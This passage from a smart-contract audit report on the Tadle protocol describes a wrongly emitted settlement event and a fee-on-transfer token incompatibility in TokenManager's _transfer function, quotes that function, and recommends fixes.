Incorrect event is emitted when calling \u0060settleAskTaker()\u0060. Instead of emitting \u0060SettledAskTaker\u0060, \u0060SettledBidTaker\u0060 is emitted.

#### Vulnerability Details
[Link to Code](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/PreMarkets.sol#L775)  
On line 775 in \u0060PreMarkets.sol\u0060, \u0060SettledBidTaker\u0060 is emitted instead of \u0060SettledAskTaker\u0060.

#### Impact
Wrong event emitted can lead to inconsistency in off-chain related software.

Manual review.

#### Recommendations
Emit \u0060SettledAskTaker\u0060 instead of \u0060SettledBidTaker\u0060.

### L02: Fee on transfer ERC20 collateral tokens can lead to DoS when trying to transfer them
Checking for balance before and after transferring tokens is incompatible with ERC20 tokens that implement fee-on-transfer functionality. This is because fee-on-transfer tokens deduct a fee during the transfer process, causing the post-transfer balance to be less than expected. As a result, simple balance checks may incorrectly flag successful transfers as failures, leading to issues in handling such tokens correctly.
## _transfer() function in TokenManager.sol
Function: 
\u0060\u0060\u0060sol
function _transfer( 
    address _token, 
    address _from, 
    address _to, 
    uint256 _amount, 
    address _capitalPoolAddr 
) internal { 
    uint256 fromBalanceBef = IERC20(_token).balanceOf(_from); 
    uint256 toBalanceBef = IERC20(_token).balanceOf(_to); 
    if ( 
        _from == _capitalPoolAddr && 
        IERC20(_token).allowance(_from, address(this)) == 0x0 
    ) { 
        ICapitalPool(_capitalPoolAddr).approve(address(this)); 
    } 
    _safe_transfer_from(_token, _from, _to, _amount); 
    uint256 fromBalanceAft = IERC20(_token).balanceOf(_from); 
    uint256 toBalanceAft = IERC20(_token).balanceOf(_to); 
    if (fromBalanceAft != fromBalanceBef - _amount) { 
        revert TransferFailed(); 
    } 
    if (toBalanceAft != toBalanceBef + _amount) { 
        revert TransferFailed(); 
    } 
}
\u0060\u0060\u0060

Some tokens can lead to DoS of the protocol functionality.

Manual review.

Instead of strictly comparing fromBalanceAft with fromBalanceBef - _amount, calculate the actual amount transferred by subtracting fromBalanceAft from fromBalanceBef. This allows the function to accommodate fee-on-transfer tokens, where the actualAmountTransferred might be less than the _amount. Based on the protocol team, accepted fee can be adjusted.
## PreMarkets::createOffer allows a user to create an offer with eachTradeTax more than Constants.EACH_TRADE_TAX_MAXINUM allowing the user to even charge 100% of the future sales.
